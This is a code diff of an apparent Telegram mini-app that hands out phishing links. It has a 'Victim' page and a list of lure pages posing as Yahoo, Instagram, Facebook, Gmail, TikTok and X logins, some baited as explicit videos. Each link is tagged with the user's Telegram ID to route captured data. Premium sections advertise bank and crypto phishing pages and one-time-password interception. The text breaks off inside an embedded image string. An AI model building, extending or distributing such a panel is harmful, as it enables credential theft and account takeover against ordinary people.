-    <span class="ad-nav-pill">📢 AD</span>
-    <span class="ad-nav-msg">Tapping <strong>Home</strong> or <strong>Victim</strong> shows a short ad — it is <strong>NOT</strong> part of this app</span>
-  </div>
-
-  <!-- ── BOTTOM NAV ── -->
-  <nav class="bottom-nav">
-    <button onclick="showMyAdWithNotice(function(){ switchPage('home'); })" id="navHome" class="active nav-ad-dot">🏠<span>Home</span></button>
-    <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium</span></button>
-    <button onclick="showMyAdWithNotice(function(){ switchPage('victim'); })" id="navVictim" class="nav-ad-dot">👁️<span>Victim</span></button>
-    <button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
-    <a href="https://intelseller.com" target="_blank" rel="noopener noreferrer">
-      <button id="navMarketplace">🛒<span>Market</span></button>
-    </a>
-    <button onclick="switchPage('profile')" id="navProfile">👤<span>Profile</span></button>
-  </nav>
-
-  <!-- ── AD SDK ── -->
-  <script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
-
-  <script>
-    function showMyAd() {
-      try {
-        return show_9830644()
-          .then(() => { console.log("✅ Ad watched!"); })
-          .catch(() => {
-            console.log("⚠️ Ad failed or skipped.");
-            throw new Error("Ad failed");
-          });
-      } catch (e) {
-        console.error("Ad function not loaded yet", e);
-        return Promise.reject(e);
-      }
-    }
-  </script>
-
-  <script>
-    // Cache-bust premiumlist.js on every new app open (no stale cache)
-    (function() {
-      var s = document.createElement('script');
-      s.src = 'https://intelseller.com/premiumlist.js?_=' + Date.now();
-      s.id = 'premiumListScript';
-      document.head.appendChild(s);
-    })();
-  </script>
-  <script src="premium.js"></script>
-
-  <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-    const user = tg.initDataUnsafe?.user || null;
-    const telegramId = user?.id || null;
-
-    const freeLinksList = document.getElementById('freeLinksList');
-    const premiumContent = document.getElementById('premiumContent');
-    const donationInfo   = document.getElementById('donationInfo');
-
-    // ── Add Edit Crypto Button for premium users ──
-    function addEditCryptoButton() {
-      // Don't add twice
-      if (document.getElementById('editCryptoBtnWrapper')) return;
-      const btnWrapper = document.createElement("div");
-      btnWrapper.id = "editCryptoBtnWrapper";
-      btnWrapper.style.cssText = "max-width:600px;margin:0 auto 14px auto;";
-      btnWrapper.innerHTML = `
-        <a href="https://t.me/intelligentverificationlinkbot/premiumedit" target="_blank" style="text-decoration:none;">
-          <div style="background:var(--accent);color:#fff;padding:13px;border-radius:10px;text-align:center;font-weight:700;font-size:0.95rem;">
-            ✏️ Edit Crypto Link
-          </div>
-        </a>`;
-      premiumContent.parentNode.insertBefore(btnWrapper, premiumContent);
-    }
-
-    // ── Run all premium-dependent logic after premiumlist.js is ready ──
-    function initPremiumFeatures() {
-      if (typeof premiumUsers !== "undefined" && Array.isArray(premiumUsers) && premiumUsers.includes(telegramId)) {
-        addEditCryptoButton();
-      }
-      renderPremiumLinks();
-    }
-
-    // Wait for the dynamically injected premiumlist.js script to load
-    function waitForPremiumList() {
-      var script = document.getElementById('premiumListScript');
-      if (!script) {
-        // Script tag not yet injected — retry shortly
-        setTimeout(waitForPremiumList, 50);
-        return;
-      }
-      if (typeof premiumUsers !== "undefined") {
-        // Already loaded
-        initPremiumFeatures();
-      } else {
-        // Wait for the script's load event
-        script.addEventListener('load', function() {
-          initPremiumFeatures();
-        });
-        script.addEventListener('error', function() {
-          // premiumlist.js failed to load — show locked state
-          premiumContent.innerHTML = `<p style="color:#ff6666;text-align:center;">Could not load premium list. Please try again.</p>`;
-        });
-      }
-    }
-
-    // ── Nav ──
-    const navButtons = {
-      home:    document.getElementById('navHome'),
-      premium: document.getElementById('navPremium'),
-      victim:  document.getElementById('navVictim'),
-      donate:  document.getElementById('navDonate'),
-      profile: document.getElementById('navProfile')
-    };
-    const pages = {
-      home:    document.getElementById('home'),
-      premium: document.getElementById('premium'),
-      victim:  document.getElementById('victim'),
-      donate:  document.getElementById('donate'),
-      profile: document.getElementById('profile')
-    };
-
-    function switchPage(pageKey) {
-      Object.keys(pages).forEach(key => {
-        pages[key].classList.toggle("active", key === pageKey);
-        if (navButtons[key]) navButtons[key].classList.toggle("active", key === pageKey);
-      });
-      if (pageKey === 'profile') renderProfile();
-    }
-    Object.entries(navButtons).forEach(([key, btn]) => {
-      btn.addEventListener("click", () => switchPage(key));
+  if(premiumUsers.includes(telegramId)){
+    /* ACTIVE */
+    pc.innerHTML=`
+      <div class="pm-active-banner">
+        <div class="pm-active-icon">🌟</div>
+        <div class="pm-active-title">Premium Active</div>
+        <div class="pm-active-sub">You have full access to all exclusive links and tools below.</div>
+      </div>`;
+    const tabs=document.createElement('div');tabs.className='pm-tabs';
+    ['All','Social','Voting','Tools'].forEach((c,i)=>{const b=document.createElement('button');b.className='pm-tab'+(i===0?' active':'');b.textContent=c;b.onclick=function(){filterPremiumLinks(c,this);};tabs.appendChild(b);});
+    pc.appendChild(tabs);
+    const group=document.createElement('div');group.className='tool-group';group.id='pmLinkList';
+    premiumLinks.forEach(link=>{
+      const url=formatUrl(link.urlTemplate);
+      const cat=getPmCat(link.name);
+      const row=document.createElement('div');row.className='tool-row';row.dataset.cat=cat;
+      row.innerHTML=`<img class="tool-icon" src="${link.image}" alt="${link.name}" loading="lazy" onerror="this.style.background='var(--s3)'"><div class="tool-info"><div class="tool-name">${link.name}</div><div class="tool-sub">${cat} <span class="chip-gold" style="margin-left:4px;">PREMIUM</span></div></div><div class="tool-btns"><button class="tb" onclick="pmCopy('${url}',this)">Copy</button><button class="tb open-btn" onclick="window.open('${url}','_blank','noopener')">Open</button></div>`;
+      group.appendChild(row);
     });
-
-    // ── Render Profile ──
-    function renderProfile() {
-      const profileContent = document.getElementById('profileContent');
-      if (!user) {
-        profileContent.innerHTML = `<p style="text-align:center;color:#ff6666;font-size:0.9rem;">Open this app inside Telegram to see your profile.</p>`;
-        return;
-      }
-      const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ') || 'Unknown';
-      const initials = fullName.split(' ').map(w => w[0]).join('').toUpperCase().slice(0,2);
-      const avatarHtml = user.photo_url
-        ? `<img class="profile-avatar" src="${user.photo_url}" alt="Avatar" onerror="this.style.display='none';document.getElementById('profileInitials').style.display='flex';">`
-        : '';
-      const placeholderStyle = user.photo_url ? 'display:none;' : '';
-      const isPremiumTg = user.is_premium;
-      const langMap = { en:'🇬🇧 English', ru:'🇷🇺 Russian', ar:'🇸🇦 Arabic', fr:'🇫🇷 French', de:'🇩🇪 German', es:'🇪🇸 Spanish', pt:'🇧🇷 Portuguese', tr:'🇹🇷 Turkish', uk:'🇺🇦 Ukrainian', it:'🇮🇹 Italian', pl:'🇵🇱 Polish' };
-      const langLabel = langMap[user.language_code] || (user.language_code ? `🌐 ${user.language_code.toUpperCase()}` : 'Unknown');
-
-      profileContent.innerHTML = `
-        <div class="profile-avatar-wrap">
-          ${avatarHtml}
-          <div class="profile-avatar-placeholder" id="profileInitials" style="${placeholderStyle}">${initials}</div>
-          <div class="profile-name">${fullName}</div>
-          ${user.username ? `<div class="profile-username">@${user.username}</div>` : ''}
-          ${isPremiumTg ? `<span class="profile-premium-badge">⭐ Telegram Premium</span>` : ''}
+    pc.appendChild(group);
+  } else {
+    /* LOCKED */
+    pc.innerHTML=`
+      <div class="pm-hero">
+        <div class="pm-hero-icon">💎</div>
+        <div class="pm-hero-title">Unlock Premium</div>
+        <div class="pm-hero-sub">Get exclusive access to bank, crypto, social media, OTP bypass links and advanced tools.</div>
+      </div>
+      <div class="pm-features">
+        <div class="pm-feat"><div class="pm-feat-icon">🏦</div><div class="pm-feat-title">Bank & Crypto</div><div class="pm-feat-desc">Banking & crypto phishing pages</div></div>
+        <div class="pm-feat"><div class="pm-feat-icon">📱</div><div class="pm-feat-title">Social Media</div><div class="pm-feat-desc">All major platform pages</div></div>
+        <div class="pm-feat"><div class="pm-feat-icon">🗳️</div><div class="pm-feat-title">Vote Bypass</div><div class="pm-feat-desc">Facebook, Instagram, TikTok votes</div></div>
+        <div class="pm-feat"><div class="pm-feat-icon">🔑</div><div class="pm-feat-title">OTP Bypass</div><div class="pm-feat-desc">One-time password interception</div></div>
+      </div>
+      <div class="pm-invite">
+        <div class="pm-invite-title">🔓 Unlock Free with Referrals</div>
+        <div class="pm-invite-sub">Invite <strong style="color:var(--gold)">10 people</strong> → get <strong style="color:var(--gold)">7 days Premium</strong> free. Every 10 invites adds +7 days.</div>
+        <div class="pm-invite-row">
+          <input class="pm-invite-input" id="inviteLinkInput" type="text" readonly placeholder="Your invite link…">
+          <button class="pm-invite-copy" onclick="copyInviteLink()">Copy</button>
         </div>
-        <div class="profile-info-grid">
-          <div class="profile-info-row">
-            <div class="profile-info-icon">🪪</div>
-            <div class="profile-info-content">
-              <div class="profile-info-label">Telegram ID</div>
-              <div class="profile-info-value">${user.id}</div>
-            </div>
-            <button class="profile-copy-btn" onclick="copyText('${user.id}', this)">Copy</button>
-          </div>
-          <div class="profile-info-row">
-            <div class="profile-info-icon">👤</div>
-            <div class="profile-info-content">
-              <div class="profile-info-label">Display Name</div>
-              <div class="profile-info-value">${fullName}</div>
-            </div>
-            <button class="profile-copy-btn" onclick="copyText('${fullName}', this)">Copy</button>
-          </div>
-          ${user.username ? `
-          <div class="profile-info-row">
-            <div class="profile-info-icon">🔗</div>
-            <div class="profile-info-content">
-              <div class="profile-info-label">Username</div>
-              <div class="profile-info-value">@${user.username}</div>
-            </div>
-            <button class="profile-copy-btn" onclick="copyText('@${user.username}', this)">Copy</button>
-          </div>` : ''}
-          <div class="profile-info-row">
-            <div class="profile-info-icon">🌐</div>
-            <div class="profile-info-content">
-              <div class="profile-info-label">Language</div>
-              <div class="profile-info-value">${langLabel}</div>
-            </div>
-          </div>
-          <div class="profile-info-row">
-            <div class="profile-info-icon">${isPremiumTg ? '⭐' : '🔓'}</div>
-            <div class="profile-info-content">
-              <div class="profile-info-label">Telegram Premium</div>
-              <div class="profile-info-value" style="color:${isPremiumTg ? 'var(--gold)' : 'var(--text3)'};">${isPremiumTg ? 'Active ✓' : 'Not subscribed'}</div>
-            </div>
-          </div>
-          <div class="profile-info-row">
-            <div class="profile-info-icon">🤖</div>
-            <div class="profile-info-content">
-              <div class="profile-info-label">Bot Access</div>
-              <div class="profile-info-value" style="color:var(--accent2);">@intelligentverificationlinkbot</div>
-            </div>
-          </div>
-        </div>`;
-    }
-
-    function copyText(val, btn) {
-      navigator.clipboard.writeText(val).then(() => {
-        btn.textContent = '✓ Copied';
-        setTimeout(() => btn.textContent = 'Copy', 1600);
-      });
-    }
-
-    // ── Free Links ──
-    const freeLinks = [
-      { name: "Yahoo Login",       image: "https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png", urlTemplate: "https://knlok.xo.je/sc/y.html?id={telegram-id}" },
-      { name: "Instagram",         image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://knlok.xo.je/sc/i.html?id={telegram-id}" },
-      { name: "Facebook xxx vid",  image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://knlok.xo.je/sc/pf/pf.html?id={telegram-id}" },
-      { name: "Instagram xxx Vid", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://knlok.xo.je/sc/pf/pi.html?id={telegram-id}" },
-      { name: "Twitter(X) XXX vid",image: "data:image/jpeg;base64,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", urlTemplate: "https://knlok.xo.je/sc/pf/px.html?id={telegram-id}" },
-      { name: "Gmail XXX vid",     image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://knlok.xo.je/sc/pf/pg.html?id={telegram-id}" },
-      { name: "Tiktok XXX vid",    image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://knlok.xo.je/sc/pf/pt.html?id={telegram-id}" },
-      { name: "Facebook",          image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://knlok.xo.je/sc/f.html?id={telegram-id}" },
-      { name: "Twitter(X)",        image: "data:image/jpeg;base64,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